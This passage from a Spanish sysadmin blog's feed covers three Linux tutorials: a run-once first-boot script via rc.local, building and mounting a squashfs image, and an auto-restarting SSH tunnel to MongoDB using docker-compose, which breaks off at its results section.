&lt;p&gt;Con un poco de lógica, podemos hacer lo sugerido: un &lt;em&gt;script&lt;/em&gt; que ejecute algo y genere el &lt;em&gt;log&lt;/em&gt; para que no se vuelva a ejecutar de nuevo. Sin embargo, parece adecuado disponer de un &lt;em&gt;framework&lt;/em&gt; que separe la lógica de ejecución, del &lt;em&gt;script&lt;/em&gt; ejecutado.&lt;/p&gt;
&lt;p&gt;Esto nos permite distribuir nuestras imágenes base con el &lt;em&gt;script&lt;/em&gt; y dejar al usuario la opción de poner o no un &lt;em&gt;script&lt;/em&gt; de inicialización, y de que poner en él. Así pues, un posible ejemplo sería este:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# cat /etc/rc.local
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nv"&gt;SCRIPT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/firstboot.sh
&lt;span class="nv"&gt;LOG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/firstboot.log

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -x &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; ! -e &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;LOG&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &amp;gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;LOG&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Básicamente, preguntamos si el &lt;em&gt;script&lt;/em&gt; existe y es ejecutable, y en ese caso, si no existe el log previamente generado. En caso afirmativo, ejecutamos el script y recogemos la salida, a modo de &lt;em&gt;log&lt;/em&gt; y a modo de marca para no volver a lanzarlo.&lt;/p&gt;
&lt;p&gt;Solo nos queda pendiente darle permisos de ejecución, porque sino, &lt;strong&gt;systemd&lt;/strong&gt; lo ignoraría.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# chmod a+x /etc/rc.local
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Usando la plantilla&lt;/h3&gt;
&lt;p&gt;Hemos llegado a ese momento en el que clonamos la plantilla y tenemos que poner el &lt;em&gt;script&lt;/em&gt; de inicialización. Siguiendo el &lt;em&gt;script&lt;/em&gt; arriba mencionado, solo tenemos que poner un &lt;em&gt;script&lt;/em&gt; que haga lo que nos interese. En este caso, con un &lt;em&gt;log&lt;/em&gt; para ver que funciona, nos vale.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# cat firstboot.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;First time boot. Running as:&amp;quot;&lt;/span&gt;
id
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No os olvidéis de darle permisos de ejecución:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# chmod a+x firstboot.sh
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si reiniciamos el servidor podremos ver la magia: como hay un script y no hay &lt;em&gt;log&lt;/em&gt;, se va a ejecutar, generando el &lt;em&gt;log&lt;/em&gt;. Solo nos queda verlo en directo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# cat firstboot.log
First &lt;span class="nb"&gt;time&lt;/span&gt; boot. Running as:
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;grupos&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
root@firstboot:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y por mucho que reiniciéis, no se va a volver a ejecutar, a menos claro, que eliminéis el fichero de &lt;em&gt;log&lt;/em&gt;, dejando el &lt;em&gt;script&lt;/em&gt; en su sitio.&lt;/p&gt;
&lt;h3&gt;Uso práctico&lt;/h3&gt;
&lt;p&gt;En mi caso concreto, he creado &lt;em&gt;scripts&lt;/em&gt; genéricos para instalar:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un servidor de &lt;strong&gt;mongodb&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un servidor &lt;strong&gt;uwsgi&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un frontal &lt;strong&gt;nginx&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un balanceador &lt;strong&gt;haproxy&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, cuando creo un proyecto nuevo, solo tengo que asignar los &lt;em&gt;script&lt;/em&gt; correspondientes a cada instancia de mi &lt;em&gt;hosting&lt;/em&gt;. Con algunas modificaciones a los ficheros de configuración y la aplicación propiamente dicha, tengo un entorno corriendo en tiempo record.&lt;/p&gt;</content><category term="systemd"></category><category term="script"></category></entry><entry><title>Un sistema de ficheros comprimido y de solo lectura: squashfs</title><link href="http://www.linuxsysadmin.ml/2018/02/un-sistema-de-ficheros-comprimido-y-de-solo-lectura-squashfs.html" rel="alternate"></link><published>2018-02-19T10:00:00+01:00</published><updated>2018-02-19T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-19:/2018/02/un-sistema-de-ficheros-comprimido-y-de-solo-lectura-squashfs.html</id><summary type="html">&lt;p&gt;Cuando trabajamos con tamaños de disco muy limitados, como por ejemplo en dispositivos &lt;em&gt;embedded&lt;/em&gt; o &lt;em&gt;pendrives&lt;/em&gt;, nos vemos obligados a reducir nuestros sistemas de ficheros. Algunos de estos sistemas de ficheros son de solo lectura, y vienen comprimidos, lo que nos permite ahorrar en espacio de disco, no en funcionalidades …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando trabajamos con tamaños de disco muy limitados, como por ejemplo en dispositivos &lt;em&gt;embedded&lt;/em&gt; o &lt;em&gt;pendrives&lt;/em&gt;, nos vemos obligados a reducir nuestros sistemas de ficheros. Algunos de estos sistemas de ficheros son de solo lectura, y vienen comprimidos, lo que nos permite ahorrar en espacio de disco, no en funcionalidades.&lt;/p&gt;
&lt;p&gt;En este campo aparece el nombre de &lt;em&gt;squashfs&lt;/em&gt;, que es básicamente un sistema de ficheros &lt;em&gt;ext2&lt;/em&gt; comprimido. La única diferencia entre &lt;em&gt;ext2&lt;/em&gt;, &lt;em&gt;ext3&lt;/em&gt; y &lt;em&gt;ext4&lt;/em&gt; es el &lt;em&gt;journal&lt;/em&gt;, que es el registro encargado de que no se pierdan las escrituras hechas en el disco en caso de fallo antes de &lt;em&gt;flushear&lt;/em&gt; lo &lt;em&gt;bufferes&lt;/em&gt;, así que la version &lt;em&gt;ext2&lt;/em&gt; no es ni un atraso ni un impedimento.&lt;/p&gt;
&lt;h2&gt;Creación del sistema de ficheros&lt;/h2&gt;
&lt;p&gt;Para crear un sistema de ficheros nos hacen falta las herramientas &lt;strong&gt;mksquashfs&lt;/strong&gt; y posiblemente el decompresor &lt;strong&gt;unsquashfs&lt;/strong&gt;. En &lt;em&gt;Debian&lt;/em&gt; se pueden obtener instalando el paquete &lt;strong&gt;squashfs-tools&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-get install squashfs-tools
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes adicionales:
  liblzo2-2
Se instalarán los siguientes paquetes NUEVOS:
  liblzo2-2 squashfs-tools
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;2&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;179&lt;/span&gt; kB de archivos.
Se utilizarán &lt;span class="m"&gt;488&lt;/span&gt; kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un sistema de ficheros normal en un carpeta, que luego vamos a comprimir. Hoy, y a modo de ejemplo, vamos a crearlos con ficheros de contenido aleatorio; normalmente suelo poner jaulas o partes del sistema operativo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ mkdir rootfs
gerard@atlantis:~/squashtest$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/urandom &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/stdout &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1K &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 &amp;gt; rootfs/file1
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;10240&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; kB, &lt;span class="m"&gt;10&lt;/span&gt; KiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;0&lt;/span&gt;,000641935 s, &lt;span class="m"&gt;16&lt;/span&gt;,0 MB/s
gerard@atlantis:~/squashtest$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/urandom &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/stdout &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1K &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 &amp;gt; rootfs/file2
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;10&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;10240&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; kB, &lt;span class="m"&gt;10&lt;/span&gt; KiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;0&lt;/span&gt;,000119261 s, &lt;span class="m"&gt;85&lt;/span&gt;,9 MB/s
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si miramos lo que nos ha quedado, vemos que el resultado es el correcto. Tened en cuenta que la carpeta contenedora &lt;em&gt;rootfs&lt;/em&gt; se considerará la raíz del sistema de ficheros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ tree -h
.
└── &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.0K&lt;span class="o"&gt;]&lt;/span&gt;  rootfs
    ├── &lt;span class="o"&gt;[&lt;/span&gt; 14K&lt;span class="o"&gt;]&lt;/span&gt;  file1
    └── &lt;span class="o"&gt;[&lt;/span&gt; 14K&lt;span class="o"&gt;]&lt;/span&gt;  file2

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda lanzar el comando &lt;strong&gt;mksquashfs&lt;/strong&gt; que se encargará de comprimir el conjunto de carpetas que indiquemos y creará el fichero que declaremos en el último parámetro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ mksquashfs rootfs/ rootfs.sqsh
Parallel mksquashfs: Using &lt;span class="m"&gt;1&lt;/span&gt; processor
Creating &lt;span class="m"&gt;4&lt;/span&gt;.0 filesystem on rootfs.sqsh, block size &lt;span class="m"&gt;131072&lt;/span&gt;.
&lt;span class="o"&gt;[==================================================================================================================================================================================================&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;/2 &lt;span class="m"&gt;100&lt;/span&gt;%

Exportable Squashfs &lt;span class="m"&gt;4&lt;/span&gt;.0 filesystem, gzip compressed, data block size &lt;span class="m"&gt;131072&lt;/span&gt;
        compressed data, compressed metadata, compressed fragments, compressed xattrs
        duplicates are removed
Filesystem size &lt;span class="m"&gt;20&lt;/span&gt;.80 Kbytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.02 Mbytes&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="m"&gt;76&lt;/span&gt;.13% of uncompressed filesystem size &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;27&lt;/span&gt;.32 Kbytes&lt;span class="o"&gt;)&lt;/span&gt;
Inode table size &lt;span class="m"&gt;53&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.05 Kbytes&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="m"&gt;54&lt;/span&gt;.08% of uncompressed inode table size &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;98&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
Directory table size &lt;span class="m"&gt;30&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.03 Kbytes&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="m"&gt;75&lt;/span&gt;.00% of uncompressed directory table size &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;40&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
Number of duplicate files found &lt;span class="m"&gt;0&lt;/span&gt;
Number of inodes &lt;span class="m"&gt;3&lt;/span&gt;
Number of files &lt;span class="m"&gt;2&lt;/span&gt;
Number of fragments &lt;span class="m"&gt;1&lt;/span&gt;
Number of symbolic links  &lt;span class="m"&gt;0&lt;/span&gt;
Number of device nodes &lt;span class="m"&gt;0&lt;/span&gt;
Number of fifo nodes &lt;span class="m"&gt;0&lt;/span&gt;
Number of socket nodes &lt;span class="m"&gt;0&lt;/span&gt;
Number of directories &lt;span class="m"&gt;1&lt;/span&gt;
Number of ids &lt;span class="o"&gt;(&lt;/span&gt;unique uids + gids&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
Number of uids &lt;span class="m"&gt;1&lt;/span&gt;
        gerard &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
Number of gids &lt;span class="m"&gt;1&lt;/span&gt;
        gerard &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver en este caso que el tamaño del sistema de ficheros final es solamente el 76.13% de lo que era antes de comprimir. No es mucho, pero con ficheros más realistas suele comprimir más, pero de momento nos vale. Veamos el tamaño final del sistema de ficheros, que se queda en 24kb:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ ls -lh
total 28K
drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; gerard gerard &lt;span class="m"&gt;4&lt;/span&gt;,0K sep &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:43 rootfs
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard  24K sep &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:44 rootfs.sqsh
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Uso del sistema de ficheros&lt;/h2&gt;
&lt;p&gt;Para montar el sistema de ficheros no nos hace falta nada especial, ni ninguna de las &lt;strong&gt;squashfs-tools&lt;/strong&gt;, al menos en &lt;em&gt;Debian&lt;/em&gt;, que ya incluye el módulo de &lt;em&gt;squashfs&lt;/em&gt; en el &lt;em&gt;kernel&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El fichero &lt;em&gt;rootfs.sqsh&lt;/em&gt; no sirve por si solo; hay que montarlo. Supongamos que queremos montar nuestro nuevo sistema de ficheros en la carpeta &lt;em&gt;mount/&lt;/em&gt;, que al no existir, crearemos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ mkdir mount
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando de montaje no es diferente de cualquier otro, y lo podríamos poner en el &lt;em&gt;/etc/fstab&lt;/em&gt; para que se monte solo en cada reinicio. De momento os paso el comando de &lt;em&gt;mount&lt;/em&gt; básico, que demuestra lo fácil que es de hacer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ sudo mount rootfs.sqsh mount/
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
gerard@atlantis:~/squashtest$ tree mount/
mount/
├── file1
└── file2

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como todo sistema de ficheros montado en &lt;em&gt;linux&lt;/em&gt;, queda accesible en la carpeta de montaje. Para acceder a los ficheros solo necesitamos hacerlo de la forma habitual, aunque por tratarse de un sistema de ficheros de solo lectura, solo podemos leerlo, pero no escribirlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/squashtest$ touch mount/hello
touch: no se puede efectuar &lt;span class="sb"&gt;`&lt;/span&gt;touch&lt;span class="s1"&gt;&amp;#39; sobre &amp;#39;&lt;/span&gt;mount/hello&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;: Sistema de ficheros de sólo lectura
gerard@atlantis:~/squashtest$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo una capa de lectura y escritura&lt;/h2&gt;
&lt;p&gt;Un sistema de ficheros de lectura solo no tiene mucha utilidad en sí misma; aunque es verdad que podemos poner la jaula como solo lectura y montar una carpeta de trabajo solamente. Sin embargo hay otro método ámpliamente utilizado para hacer que parezca de lectura y escritura.&lt;/p&gt;
&lt;p&gt;Se trata del método que utiliza la distribución &lt;a href="https://www.slax.org/es/"&gt;Slax&lt;/a&gt;. La idea es que el sistema de ficheros "final" es una carpeta en la que se montan varias capas de sistema de ficheros. Esto se consigue con sistemas de ficheros tipo &lt;em&gt;UnionFS&lt;/em&gt;, &lt;em&gt;AUFS&lt;/em&gt; o &lt;em&gt;overlayfs&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De esta forma podemos tener la imagen base, posiblemente compartida por varios montajes distintos, y luego disponer de varias capas de diferencias respecto al original. Estas capas de diferencias suelen ser más pequeñas que la imagen base y se pueden descartar para volver a la versíon original de lo que teníamos en la carpeta.&lt;/p&gt;</content><category term="squashfs"></category><category term="mount"></category><category term="filesystem"></category></entry><entry><title>Túneles SSH con reinicio automático con Docker</title><link href="http://www.linuxsysadmin.ml/2018/02/tuneles-ssh-con-reinicio-automatico-con-docker.html" rel="alternate"></link><published>2018-02-12T10:00:00+01:00</published><updated>2018-02-12T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-12:/2018/02/tuneles-ssh-con-reinicio-automatico-con-docker.html</id><summary type="html">&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html"&gt;un artículo anterior&lt;/a&gt; como delegar en &lt;strong&gt;SystemD&lt;/strong&gt; la persistencia de túneles SSH. El otro día intenté reproducirlo sin éxito en un servidor con una versión baja de &lt;strong&gt;SystemD&lt;/strong&gt;; finalmente me di cuenta de que había otra herramienta en el servidor capaz de reiniciar un túnel caído: &lt;strong&gt;Docker …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html"&gt;un artículo anterior&lt;/a&gt; como delegar en &lt;strong&gt;SystemD&lt;/strong&gt; la persistencia de túneles SSH. El otro día intenté reproducirlo sin éxito en un servidor con una versión baja de &lt;strong&gt;SystemD&lt;/strong&gt;; finalmente me di cuenta de que había otra herramienta en el servidor capaz de reiniciar un túnel caído: &lt;strong&gt;Docker&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;El problema&lt;/h2&gt;
&lt;p&gt;El contexto no cambia respecto al citado artículo: tengo un servidor ejecutando los servicios de &lt;strong&gt;MongoDB&lt;/strong&gt; y &lt;strong&gt;SSH&lt;/strong&gt;, pero no puedo acceder a la base de datos porque expone su &lt;em&gt;socket&lt;/em&gt; solo a &lt;em&gt;localhost&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En circunstancias normales, el túnel es trivial:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -L &lt;span class="m"&gt;9999&lt;/span&gt;:localhost:27017 usuario@servidor -Nf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pero en mi entorno de trabajo, debido a directivas de seguridad arbitrarias, ese túnel se caía demasiado a menudo, y levantarlo manualmente era muy pesado.&lt;/p&gt;
&lt;h2&gt;La solución&lt;/h2&gt;
&lt;p&gt;Fallado el intento con &lt;strong&gt;SystemD&lt;/strong&gt;, decidí dar un intento a &lt;strong&gt;Docker&lt;/strong&gt;, y este es el resultado; se trata solamente de una imagen con el cliente &lt;strong&gt;SSH&lt;/strong&gt; que más nos convenga, con una distribución base de nuestro agrado, por ejemplo, &lt;strong&gt;Alpine Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ cat context/Dockerfile 
FROM alpine:3.6
RUN apk add --no-cache openssh-client
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con estas herramientas, nos valdría con lanzar el comando del túnel, pero habrá que acompañar el contenedor hecho a partir de esta imagen de varias cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La clave &lt;strong&gt;SSH&lt;/strong&gt; para levantar el túnel sin contraseña, evitando una intervención manual o el fallo directo del &lt;code&gt;docker run&lt;/code&gt;. Por supuesto, el servidor destino debe aceptar la clave para el usuario indicado en el comando del túnel.&lt;/li&gt;
&lt;li&gt;Una configuración &lt;strong&gt;SSH&lt;/strong&gt; cliente que impida detenernos en el momento de aceptar el &lt;em&gt;fingerprint&lt;/em&gt; del servidor destino.&lt;/li&gt;
&lt;li&gt;El propio comando del túnel &lt;strong&gt;SSH&lt;/strong&gt;, que no hemos puesto en el &lt;em&gt;Dockerfile&lt;/em&gt; para poder levantar diferentes túneles con la misma imagen.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Es especialmente importante respetar el usuario y los permisos de los fichero &lt;em&gt;id_rsa&lt;/em&gt; y &lt;em&gt;config&lt;/em&gt;, siendo &lt;code&gt;root:root:600&lt;/code&gt; para el primero y &lt;code&gt;root:root:644&lt;/code&gt; para el segundo.&lt;/p&gt;
&lt;p&gt;Podemos levantar esta imagen con el comando &lt;code&gt;docker run&lt;/code&gt; habitual, pero como tiene varios añadidos, y por comodidad, usaremos &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  mongotunnel:
    build: context
    volumes:
      - ./id_rsa:/root/.ssh/id_rsa
      - ./config:/root/.ssh/config
    ports:
      - &lt;span class="s2"&gt;&amp;quot;27777:9999&amp;quot;&lt;/span&gt;
    extra_hosts:
      - &lt;span class="s2"&gt;&amp;quot;mongoserver:192.168.1.135&amp;quot;&lt;/span&gt;
    command: ssh -L &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:9999:localhost:27017 jump@mongoserver -N
    stdin_open: &lt;span class="nb"&gt;true&lt;/span&gt;
    restart: always
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos observar el el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; otras varias anomalías:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;restart: always&lt;/strong&gt; &amp;rarr; Este es el punto de todo el artículo; queremos que cuando el túnel se caiga, el mismo demonio de &lt;strong&gt;Docker&lt;/strong&gt; se ocupe de levantarlo de nuevo.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; stdin_open: true&lt;/strong&gt; &amp;rarr; Sin este parámetro, el túnel se cerraba nada más establecerse; sospecho que esta era la causa de que no funcionara la solución con &lt;strong&gt;SystemD&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;extra_hosts&lt;/strong&gt; &amp;rarr; No es indispensable, pero he querido utilizar nombres de servidor por claridad, aunque no dispongo de resolución de nombres para mis servidores locales. Esto añade la correspondiente entrada en &lt;em&gt;/etc/hosts&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ports&lt;/strong&gt; &amp;rarr; Nuestro contenedor va a levantar el túnel en el puerto arbitrario 9999; lo mapeamos en cualquier puerto que tengamos libre en nuestro ordenador.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Adjunto la configuración &lt;strong&gt;SSH&lt;/strong&gt; para tener el ejemplo completo. No pongo la clave privada &lt;strong&gt;SSH&lt;/strong&gt; por razones de seguridad obvias; tendréis que generar vuestro propio par con el comando &lt;strong&gt;ssh-keygen&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ cat config 
Host *
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    ServerAliveInterval &lt;span class="m"&gt;60&lt;/span&gt;
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El resultado&lt;/h2&gt;
